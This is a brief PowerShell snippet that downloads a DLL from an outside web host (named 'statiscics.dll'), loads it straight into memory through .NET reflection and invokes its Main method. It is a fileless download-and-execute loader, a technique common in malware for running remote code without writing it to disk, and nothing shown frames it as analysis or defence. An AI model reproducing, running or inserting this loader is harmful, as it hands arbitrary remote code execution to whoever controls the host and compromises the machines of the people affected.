$data = (Invoke-WebRequest "https://xyz.ca/statiscics.dll" -UseBasicParsing).Content
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassName.Class1")
$method = $class.GetMethod("Main")
$method.Invoke(0, $null)

